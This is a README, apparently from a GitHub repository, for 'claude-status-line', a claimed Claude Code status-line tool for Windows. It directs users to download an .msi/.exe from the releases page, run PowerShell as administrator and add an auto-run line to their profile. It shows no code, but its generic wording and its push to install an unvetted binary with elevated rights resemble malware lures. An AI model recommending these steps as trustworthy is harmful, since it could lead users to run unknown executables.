# 📊 claude-status-line - See your development metrics at glance

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kimmihappy793/claude-status-line/releases)

This application provides a status line for Claude Code. It sits in your terminal window and shows your current progress. You can see how much context you use and if you reach rate limits. It also shows your git status and costs.

## 🛠 Why you need this

When you work with Claude Code, you move through many files. You might lose track of your current session. This tool puts that data in one place. You do not need to hunt for this info in settings or logs. The status line updates in real time. It uses colors to show your limits. Green means you have plenty of capacity. Yellow warns you of limits. Red tells you to stop.

## 📥 Getting the software

You need to download the installer from our release page. 

[Visit this page to download the latest installer](https://github.com/Kimmihappy793/claude-status-line/releases)

Look for the file that ends in .msi or .exe under the latest version. Click the file to save it to your computer.

## ⚙️ How to install on Windows

1. Open your Downloads folder.
2. Double-click the file you downloaded.
3. Follow the prompts on the screen.
4. Click Install to start the process.
5. Grant the application permission if Windows asks for it.
6. Click Finish when the window closes.

The installation adds a script to your system. This script tells your terminal how to show the status line.

## 🚀 Setting up the status line

After you install the files, you must link the status line to your terminal settings. We support PowerShell, which is the default terminal for Windows.

1. Open the Start menu.
2. Search for PowerShell.
3. Right-click the icon and choose Run as administrator.
4. Type `notepad $PROFILE` and press Enter.
5. If the file does not exist, type Y to create it.
6. Add the following line to the file: `claude-status-line --init`
7. Save the file and close Notepad.
8. Close your PowerShell window.
9. Open a new PowerShell window to see the status line at the bottom.

## 💡 What you see on the screen

The status line breaks your session data into clear groups.

### Context usage
This section shows how much of your current project Claude can see. If this number gets too high, Claude might miss details in your files. Clear your context to keep things fast.

### Git status
This shows the branch you work on now. It also flags changes. A plus sign means you have new files. A checkmark means everything is saved to the repository.

### Cost tracker
If you pay for Claude through an API key, this tool tracks your bill. It adds up the tokens you spend while you type. You will know exactly how much each task costs.

### Rate limits
Every user has a limit on how many messages they send per minute. The status line shows a bar that fills as you send messages. If the bar hits the end, wait a moment before you send more.

## 🔧 Frequently asked questions

### Do I need to update often?
Check the release page once a month. We add new features to help with different coding styles. You can install the new version over the old one.

### Can I change the colors?
The tool uses a standard color scheme to stay readable. You can adjust the settings file in your user folder if you want custom colors. Look for the config.json file in the folder where you installed the application.

### The status line does not appear
Check that you saved the Profile file correctly. Type `$PROFILE` in your PowerShell window to see where it lives. Open that specific file and make sure the command is on its own line.

### My terminal looks strange
If your terminal shows odd characters, you need a font that supports icons. We recommend using a font designed for coding, such as Fira Code or Cascadia Code. These fonts include the symbols used in the status line.

### Does it save my data?
This tool runs locally on your machine. Your costs, git details, and session info stay on your hard drive. We do not collect or store your information.

## 📝 Configuration tips

You can hide parts of the status line to save space. Open the configuration file in Notepad. Look for the section labeled Display. You can change values from true to false to hide sections like Git or Costs. Save the file and restart your terminal to see the changes.

## 🤝 Getting help

If you have trouble, open an issue on the repository. Describe the problem and tell us your version of Windows. Attach a screenshot if possible. We update the software to fix bugs as they appear.

## 💻 Technical requirements

* Windows 10 or Windows 11
* PowerShell 5.1 or newer
* A stable internet connection for cost tracking
* A font that supports special characters